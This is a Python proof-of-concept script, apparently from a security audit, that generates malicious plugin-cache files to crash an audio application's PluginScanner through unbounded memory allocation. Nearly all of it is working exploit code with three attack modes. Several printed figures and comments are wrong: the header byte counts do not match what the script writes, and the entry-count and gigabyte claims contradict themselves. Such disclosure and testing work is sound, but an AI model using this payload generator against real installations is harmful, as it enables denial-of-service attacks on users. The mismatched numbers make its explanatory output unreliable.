#!/usr/bin/env python3
"""
RTM-010 PoC: PluginScanner cache binary unbounded allocation (DoS)
Severity: High
File: AestraAudio/src/Plugin/PluginScanner.cpp lines 361-373

The plugin cache binary format (NPSC) reads a uint32_t plugin count
with no validation, then reads uint32_t string lengths with no bounds.
A crafted cache file with count=0xFFFFFFFF attempts to reserve ~17B entries.
Even with count=1000000 and large string lengths, this triggers massive allocations.
"""

import struct
import sys
import os

def write_string(f, s):
    """
    Write a UTF-8 string with a 4-byte little-endian length prefix to a binary file.
    
    Parameters:
        f (BinaryIO): Open binary file or file-like object positioned for writing; the function writes bytes to it.
        s (str): The string to encode as UTF-8 and write (prefixed by its uint32 little-endian length).
    """
    data = s.encode("utf-8")
    f.write(struct.pack("<I", len(data)))
    f.write(data)

def create_malicious_cache(output_path, mode="count"):
    """
    Generate a crafted NPSC-format plugin cache file intended to provoke unbounded-allocation behavior in a cache parser.
    
    Creates a binary file at output_path containing the NPSC magic and version header, then writes additional fields chosen by mode to trigger large or excessive allocations when the file is parsed.
    
    Parameters:
        output_path (str): Filesystem path where the crafted plugin_cache.bin will be written. Parent directories are created if needed.
        mode (str): Controls the crafted payload written after the header:
            - "count": writes a plugin count of 0xFFFFFFFF to provoke an extremely large reserve for the plugins vector.
            - "string": writes a plugin count of 1 and a following string length of 0xFFFFFFFF to provoke a very large string allocation.
            - "many": writes a plugin count of 100000 to create cumulative allocation pressure (no subsequent string data is written).
    """
    os.makedirs(os.path.dirname(output_path) if os.path.dirname(output_path) else ".", exist_ok=True)

    with open(output_path, "wb") as f:
        # Magic: NPSC
        f.write(b"NPSC")
        # Version
        f.write(struct.pack("<I", 1))

        if mode == "count":
            # Plugin count = 4 billion
            f.write(struct.pack("<I", 0xFFFFFFFF))
            print(f"[+] PoC: {output_path} (24 bytes header)")
            print(f"[+] count = 0xFFFFFFFF → plugins.reserve(4294967295)")
            print(f"[+] On systems with memory overcommit: partial reservation succeeds")
            print(f"[+] Then readString() loop reads unchecked uint32_t lengths from garbage")

        elif mode == "string":
            # Plugin count = 1, but ID string length = 4 billion
            f.write(struct.pack("<I", 1))
            f.write(struct.pack("<I", 0xFFFFFFFF))  # ID length
            print(f"[+] PoC: {output_path} (28 bytes header)")
            print(f"[+] count = 1, but readString() reads len = 0xFFFFFFFF")
            print(f"[+] std::string s(0xFFFFFFFF, '\\0') → ~4 GB allocation")
            print(f"[+] std::bad_alloc or OOM kill")

        elif mode == "many":
            # 100,000 plugins with 1MB strings each = 400 GB
            f.write(struct.pack("<I", 100000))
            # We don't write the actual data — just the header is enough to trigger
            # the reserve + the first readString will fail on short read
            print(f"[+] PoC: {output_path} (8 bytes header + no data)")
            print(f"[+] count = 100000 → plugins.reserve(100000)")
            print(f"[+] First readString() reads garbage as length → unbounded alloc")
            print(f"[+] Cumulative pressure: 6 strings per plugin × 100K = 600K allocations")

    size = os.path.getsize(output_path)
    print(f"[+] File size: {size} bytes")
    print(f"[+] Expected impact: std::bad_alloc or OOM kill on loadScanCache()")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <output.bin> [count|string|many]")
        sys.exit(1)
    mode = sys.argv[2] if len(sys.argv) > 2 else "count"
    create_malicious_cache(sys.argv[1], mode)
